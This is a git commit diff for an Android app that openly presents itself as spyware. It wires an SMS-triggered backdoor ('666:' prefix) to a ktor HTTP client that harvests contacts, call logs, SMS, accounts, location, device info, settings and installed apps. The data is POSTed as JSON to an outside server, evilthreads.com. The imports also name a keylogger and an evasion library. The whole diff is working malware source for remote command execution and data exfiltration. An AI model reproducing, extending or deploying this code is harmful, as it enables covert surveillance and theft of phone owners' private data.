b9ba3c77d5790fe481360dadef7f84b6dd50f4ee
evilthreads <evilthreads669966@gmail.com>
2020-10-07 19:07:55 -0500

    http post remote commands

--- app/src/main/java/com/evilthreads/evademe/MainActivity.kt
+++ app/src/main/java/com/evilthreads/evademe/MainActivity.kt
@@ -9,10 +9,16 @@ import com.evilthreads.drawersnifferlib.DrawerSniffer
 import com.evilthreads.evade.evade
 import com.evilthreads.keylogger.Keylogger
 import com.evilthreads.pickpocket.*
+import com.evilthreads.pickpocket.podos.*
 import com.evilthreads.smsbackdoor.SmsBackdoor
-import com.evilthreads.wakescopelib.suspendedWakeScope
-import com.evilthreads.wakescopelib.wakeScope
 import com.kotlinpermissions.KotlinPermissions
+import io.ktor.client.*
+import io.ktor.client.engine.cio.*
+import io.ktor.client.features.json.*
+import io.ktor.client.features.json.serializer.*
+import io.ktor.client.request.*
+import io.ktor.content.*
+import io.ktor.http.*
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.collect
 import kotlinx.coroutines.launch
@@ -41,6 +47,7 @@ import kotlinx.coroutines.withContext
 */
 class MainActivity : AppCompatActivity() {
     val TAG = this.javaClass.simpleName
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
@@ -66,20 +73,26 @@ class MainActivity : AppCompatActivity() {
             else
                 kotlinPermissions.permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_COARSE_LOCATION)
             kotlinPermissions.onAccepted {
-                SmsBackdoor.openDoor(this, "666:", payload = payload) { remoteCommand ->
-                    runBlocking {
-                        when (remoteCommand) {
-                            "COMMAND_GET_CONTACTS" -> calendarFlow().collect { calendarEvent -> Log.d("PICKPOCKET", calendarEvent.toString()) }
-                            "COMMAND_GET_CALL_LOG" -> callLogFlow().collect { call -> Log.d("PICKPOCKET", call.toString()) }
-                            "COMMAND_GET_SMS" -> smsFlow().collect { sms -> Log.d("PICKPOCKET", sms.toString()) }
-                            "COMMAND_GET_ACCOUNTS" -> accountsFlow().collect { account -> Log.d("PICKPOCKET", account.toString()) }
-                            "COMMAND_GET_MMS" -> smsFlow().collect { mms -> Log.d("PICKPOCKET", mms.toString()) }
-                            "COMMAND_GET_FILES" -> filesFlow().collect { file -> Log.d("PICKPOCKET", file.toString()) }
-                            "COMMAND_GET_DEVICE_INFO" -> deviceLaunch(this@MainActivity).let { device -> Log.d("PICKPOCKET", device.toString()) }
-                            "COMMAND_GET_LOCATION" -> locationLaunch(this@MainActivity)?.let { location -> Log.d("PICKPOCKET", location.toString()) }
-                            "COMMAND_GET_SETTINGS" -> settingsFlow().collect { setting -> Log.d("PICKPOCKET", setting.toString()) }
-                            "COMMAND_GET_INSTALLED_APPS" -> softwareFlow().collect { app -> Log.d("PICKPOCKET", app.toString()) }
-                            else -> Log.d(TAG, "COMMAND NOT FOUND")
+                HttpClient(CIO){
+                    install(JsonFeature){
+                        serializer = KotlinxSerializer()
+                    }
+                }.use { client ->
+                    SmsBackdoor.openDoor(this, "666:", payload = payload) { remoteCommand ->
+                        runBlocking {
+                            when (remoteCommand) {
+                                "COMMAND_GET_CONTACTS" -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
+                                "COMMAND_GET_CALL_LOG" -> callLogLaunch(this@MainActivity).let { calls -> client.upload(calls) }
+                                "COMMAND_GET_SMS" -> smsLaunch(this@MainActivity).let { smsMessages -> client.upload(smsMessages) }
+                                "COMMAND_GET_ACCOUNTS" -> accountsLaunch(this@MainActivity).let { accounts -> client.upload(accounts) }
+                                "COMMAND_GET_MMS" -> mmsLaunch(this@MainActivity).let { mmsMessages -> Log.d("PICKPOCKET", "NEEDS MULTIPART") }
+                                "COMMAND_GET_FILES" -> filesLaunch(this@MainActivity).let { files -> Log.d("PICKPOCKET", "NEEDS MULTIPART") }
+                                "COMMAND_GET_DEVICE_INFO" -> deviceLaunch(this@MainActivity).let { device -> client.upload(listOf(device)) }
+                                "COMMAND_GET_LOCATION" -> locationLaunch(this@MainActivity)?.let { location -> client.upload(listOf(location)) }
+                                "COMMAND_GET_SETTINGS" -> settingsLaunch(this@MainActivity).let { settings -> client.upload(settings) }
+                                "COMMAND_GET_INSTALLED_APPS" -> softwareLaunch(this@MainActivity).let { apps -> client.upload(apps) }
+                                else -> Log.d(TAG, "COMMAND NOT FOUND")
+                            }
                         }
                     }
                 }
@@ -88,5 +101,36 @@ class MainActivity : AppCompatActivity() {
                     DrawerSniffer.requestPermission(this)
             }.ask()
         }
+    }
+}
+
+val url = "http://evilthreads.com/"
+val contactsUri = url.plus("/contacts")
+val smsUri = url.plus("/sms")
+val callLogUri = url.plus("/calls")
+val accountsUri = url.plus("/accounts")
+val mmsUri = url.plus("/mms")
+val filesUri = url.plus("/files")
+val deviceUri = url.plus("/device")
+val locationUri = url.plus("/location")
+val settingsUri = url.plus("/settings")
+val softwareUri = url.plus("/software")
+
+inline suspend fun <reified T: PocketData>HttpClient.upload(data: Collection<T>){
+    lateinit var uri: String
+    when(data.first()){
+        is Contact -> uri = contactsUri
+        is CallLogEntry -> uri = callLogUri
+        is Sms -> uri = smsUri
+        is UserAccount -> uri = accountsUri
+        is Mms -> uri = mmsUri
+        is DocumentsFile -> uri = filesUri
+        is Device -> uri = deviceUri
+        is RecentLocation -> uri = locationUri
+        is Setting -> uri = settingsUri
+        is Software -> uri = softwareUri
+    }
+    this.post<T>(uri){
+        body = defaultSerializer().write(data, ContentType.Application.Json)
     }
 }
